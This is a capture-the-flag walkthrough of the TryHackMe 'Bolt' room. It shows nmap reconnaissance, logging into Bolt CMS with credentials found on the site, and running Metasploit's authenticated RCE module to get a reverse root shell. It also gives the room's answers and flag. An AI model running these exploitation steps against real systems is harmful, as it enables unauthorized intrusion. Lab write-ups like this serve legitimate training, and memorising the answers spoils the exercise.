# Bolt

<div align="left">

<figure><img src="../.gitbook/assets/d2a747d195d4607cfd296eb2cffb7af1.png" alt="" width="79"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Bolt](https://tryhackme.com/room/bolt)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.10.179`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

```bash
su
echo "10.10.10.179 bolt.thm" >> /etc/hosts

mkdir thm/bolt.thm  
cd thm/bolt.thm

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 bolt.thm
PING bolt.thm (10.10.10.179) 56(84) bytes of data.
64 bytes from bolt.thm (10.10.10.179): icmp_seq=1 ttl=63 time=62.3 ms
64 bytes from bolt.thm (10.10.10.179): icmp_seq=2 ttl=63 time=65.0 ms
64 bytes from bolt.thm (10.10.10.179): icmp_seq=3 ttl=63 time=63.0 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

### Task 3 - Hack your way into the machine!

#### 3.1 - Find open ports on the machine

```bash
nmap --open -n -Pn -vvv -T4 bolt.thm  
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-30 16:33 EDT
Initiating SYN Stealth Scan at 16:33
Scanning bolt.thm (10.10.10.179) [1000 ports]
Discovered open port 22/tcp on 10.10.10.179
Discovered open port 80/tcp on 10.10.10.179
Discovered open port 8000/tcp on 10.10.10.179
Completed SYN Stealth Scan at 16:33, 1.06s elapsed (1000 total ports)
Nmap scan report for bolt.thm (10.10.10.179)
Host is up, received user-set (0.070s latency).
Scanned at 2023-06-30 16:33:33 EDT for 1s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

```bash
nmap -p22,80,8000 -sCV -vvv bolt.thm
```

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaKxKph/4I3YG+2GjzPjOevcQldxrIll8wZ8SZyy2fMg3S5tl5G6PBFbF9GvlLt1X/gadOlBc99EG3hGxvAyoujfdSuXfxVznPcVuy0acAahC0ohdGp3fZaPGJMl7lW0wkPTHO19DtSsVPniBFdrWEq9vfSODxqdot8ij2PnEWfnCsj2Vf8hI8TRUBcPcQK12IsAbvBOcXOEZoxof/IQU/rSeiuYCvtQaJh+gmL7xTfDmX1Uh2+oK6yfCn87RpN2kDp3YpEHVRJ4NFNPe8lgQzekGCq0GUZxjUfFg1JNSWe1DdvnaWnz8J8dTbVZiyNG3NAVAwP1+iFARVOkiH1hi1
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE52sV7veXSHXpLFmu5lrkk8HhYX2kgEtphT3g7qc1tfqX4O6gk5IlBUH25VUUHOhB5BaujcoBeId/pMh4JLpCs=
|   256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZwq5mZftBwFP7wDFt5kinK8mM+Gk2MaPebZ4I0ukZ+
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    syn-ack ttl 63 (PHP 7.2.32-1)
|_http-generator: Bolt
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Fri, 30 Jun 2023 20:34:45 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Fri, 30 Jun 2023 20:34:45 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 8b662c
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Fri, 30 Jun 2023 20:34:45 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Fri, 30 Jun 2023 20:34:45 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: e0f88d
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-title: Bolt | A hero is unleashed
```

It looks like there are only three open ports on the machine: 22, 80, 8000.

#### 3.2 - What port number has a web server with a CMS running?

<figure><img src="../.gitbook/assets/Schermata del 2023-06-30 22-42-14.png" alt=""><figcaption><p><a href="http://bolt.thm:8000/">http://bolt.thm:8000/</a></p></figcaption></figure>

{% hint style="info" %}
8000
{% endhint %}

#### 3.3 - What is the username we can find in the CMS?

{% hint style="info" %}
Bolt
{% endhint %}

#### 3.4 - What is the password we can find for the username? 

<figure><img src="../.gitbook/assets/Schermata del 2023-06-30 23-21-11.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
boltadmin123
{% endhint %}

#### 3.5 - What version of the CMS is installed on the server? (Ex: Name 1.1.1)

Googling info about Bolt cms we found that panel is usually at location:&#x20;

IP/bolt/login, than we go to: [http://bolt.thm:8000/bolt/login](http://bolt.thm:8000/bolt/login)&#x20;

<figure><img src="../.gitbook/assets/Schermata del 2023-06-30 23-23-18.png" alt=""><figcaption></figcaption></figure>

and we log in with our credentials: bolt::boltadmin123

#### 3.6 - There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?

We can use searchsploit to find most famous exploit for bolt cms:

```bash
searchsploit bolt                   
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
Apple WebKit - 'JSC::SymbolTableEntry::isWatchable' Heap Buffer Overflow                        | multiple/dos/41869.html
Bolt CMS 3.6.10 - Cross-Site Request Forgery                                                    | php/webapps/47501.txt
Bolt CMS 3.6.4 - Cross-Site Scripting                                                           | php/webapps/46495.txt
Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution                             | php/webapps/46664.html
Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                            | php/webapps/48296.py
Bolt CMS < 3.6.2 - Cross-Site Scripting                                                         | php/webapps/46014.txt
Bolthole Filter 2.6.1 - Address Parsing Buffer Overflow                                         | multiple/remote/24982.txt
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                     | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                                            | php/webapps/48411.txt
Cannonbolt Portfolio Manager 1.0 - Multiple Vulnerabilities                                     | php/webapps/21132.txt
CMS Bolt - Arbitrary File Upload (Metasploit)                                                   | php/remote/38196.rb
------------------------------------------------------------------------------------------------ ---------------------------------
```

Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                            | php/webapps/48296.py\
\
EDB-ID is:

{% hint style="info" %}
48296
{% endhint %}

#### 3.7 - Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)

Now we launch msfconsole to find exploit path:

```

msf6 exploit(unix/webapp/bolt_authenticated_rce) > search bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great      Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   1  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
```

{% hint style="info" %}
```
exploit/unix/webapp/bolt_authenticated_rce
```
{% endhint %}

#### 3.8 - Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit

* RHOST is the ip of the machine
* LHOST is the ip of our machine’s vpn ( note: we don’t get reverse shell if we use our own ip )
* USERNAME and PASSWORD is that we found in previous enumeration
* TARGETURI is where you want to put our website url. here its bolt website in port 8000

<pre class="language-bash"><code class="lang-bash"><strong>set RHOST bolt.thm
</strong><strong>set LHOST tun0
</strong>set USERNAME bolt
set PASSWORD boltadmin123
exploit
</code></pre>

<figure><img src="../.gitbook/assets/Schermata del 2023-07-02 11-20-50 (1).png" alt=""><figcaption><p>root shell</p></figcaption></figure>

#### 3.9 - Look for flag.txt inside the machine.

flag is usually in the path: /home

```bash
cd /home
ls
bolt
composer-setup.php
flag.txt
cat flag.txt
```

or we can spawn a bash shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
find / -type f -name 'flag.txt' 2>/dev/null
cat /root/flag.txt
```

<details>

<summary>🚩 Flag 1 (flag.txt)</summary>

THM{wh0\_d035nt\_l0ve5\_b0l7\_r1gh7?}

</details>
